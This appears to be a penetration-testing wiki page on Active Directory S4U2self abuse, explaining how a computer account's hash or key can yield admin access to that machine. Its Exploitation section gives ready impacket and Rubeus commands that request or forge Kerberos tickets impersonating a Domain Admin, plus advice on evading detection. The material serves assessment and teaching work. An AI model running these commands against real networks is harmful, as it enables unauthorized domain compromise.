**Machine account to local admin (S4U2self)** — given a computer account's secret (NT hash, AES key, or password), mint a Kerberos Service Ticket to that same machine *on behalf of a domain user who is a local admin there* (typically a Domain Admin). The machine honours the ticket's PAC and grants you admin/`SYSTEM`. This is **S4U2self abuse**: every computer account has SPNs, and S4U2self needs no special delegation rights.

## When is this useful?

The catch that makes this technique look pointless: if you can read a machine's account secret, you often *already* have `SYSTEM` on it — in which case this adds nothing. The value is entirely in the cases where you hold a machine's secret **without** having compromised that machine:

- **Coerce + crack (NTLMv1)** - force the machine to authenticate to you, capture NetNTLMv1, crack it to the machine's NT hash. No prior access to the box. See [NTLMv1 Authentication Downgrade](../Coercion/NTLMv1%20Authentication%20Downgrade.md).
- **NTLM relay / add-computer** - relay to LDAP to create or take over a computer account, or recover a computer's key. See [NTLM Relay to LDAP](../Relay%20Attacks/NTLM%20Relay/NTLM%20Relay%20to%20LDAP.md).
- **Machine password recovered elsewhere** - a machine account password/hash found in shares, backups, GPP, or another host's memory (a host is not local admin on *itself* by default, so this is not automatically circular).

**Circular case (skip it):** if you obtained the hash by dumping *that machine's* own SAM/LSA/LSASS, you were already admin - use it for persistence/re-entry, not to "get" admin you already have.

**Note:** Computer accounts have **no** admin privileges of their own - they behave like ordinary domain users. This technique does not use the machine account's *own* rights; it impersonates a *different* user who has admin rights on the box.

## Discovery

None in particular - you already hold the machine account's secret (see *When is this useful?*).

**Warning:** Do not fully trust BloodHound's "Local Admin" data. Zero listed admins does not always mean there are none - the collector may just have failed to gather it. Domain Admins are local admins on domain-joined hosts by default, so impersonating `Administrator` is the reliable choice.

## Exploitation

**Key requirement:** the user you impersonate must actually be a **local admin on the target**. Impersonating a random domain user yields a valid ticket and *zero* privilege on the box.

### Method 1: S4U2self (preferred - legitimate PAC)

Stealthier than a Silver Ticket: the ticket is issued by the KDC and carries a **legitimate PAC**, so it is not a forgery.

**From Linux (impacket):**

```bash

# Request a TGT for the machine account (RC4/NT hash shown; use -aesKey if RC4 is disabled)
getTGT.py -dc-ip 'DC_IP' -hashes ':TARGET_NT_HASH' 'DOMAIN/COMPUTER_NAME$'
# S4U2self to ourselves, impersonating an admin, and swap the service to cifs
export KRB5CCNAME='COMPUTER_NAME$.ccache'
getST.py -self -impersonate 'ADM_NAME' -altservice 'cifs/COMPUTER_FQDN' -k -no-pass -dc-ip 'DC_IP' 'DOMAIN/COMPUTER_NAME$'

```

**From Windows (Rubeus):**

```powershell

# /self performs S4U2self; get the machine TGT first (here via a cert; a hash/password also works)
.\Rubeus.exe asktgt /user:COMPUTER_NAME$ /rc4:TARGET_NT_HASH /nowrap
.\Rubeus.exe s4u /self /impersonateuser:ADM_NAME /service:host/COMPUTER_FQDN /altservice:cifs/COMPUTER_FQDN /ticket:$T /ptt

```

**Note:** S4U2self can impersonate a user even if it is marked "sensitive / cannot be delegated" or is in the **Protected Users** group.

**Note:** `The specified I/O request packet (IRP) cannot be disposed of ...` when using the ticket does not always mean it is invalid - it can appear if you did not authenticate as the account named in the SPN.

### Method 2: Silver Ticket (forged, offline)

With the machine key you can forge the Service Ticket directly - no DC contact, works offline, but the PAC is forged (noisier if PAC validation is enforced).

```bash

ticketer.py -nthash 'TARGET_NT_HASH' -domain-sid 'DOMAIN_SID' -domain 'DOMAIN' -spn 'cifs/TARGET_FQDN' -groups '512,513,518,519,520' 'ADM_NAME'

```

Groups baked into the ticket: **512** Domain Admins, **513** Domain Users, **518** Schema Admins, **519** Enterprise Admins, **520** Group Policy Creator Owners. Add more if the tiering model requires it.

### Use the Service Ticket

Use the resulting ticket to execute commands on the target - see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).

## Caution

- **RC4 vs AES:** `-hashes`/`/rc4` use RC4 (noisier, and fails where RC4 is disabled). Prefer the AES key (`-aesKey` / `/aes256`) when available - stealthier and required in AES-only domains.
- **S4U2self vs Silver Ticket:** S4U2self tickets are KDC-issued with a valid PAC (harder to detect); Silver Tickets are forged offline (no DC contact, but flagged if PAC validation is on). Choose per your detection concerns.
- Note any forged/injected tickets (they live in memory / a ccache) in the report.

## References

- The Hacker Recipes - S4U2self abuse - https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse
- Elad Shamir - Wagging the Dog - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
- Impacket - https://github.com/fortra/impacket
- Rubeus - https://github.com/GhostPack/Rubeus
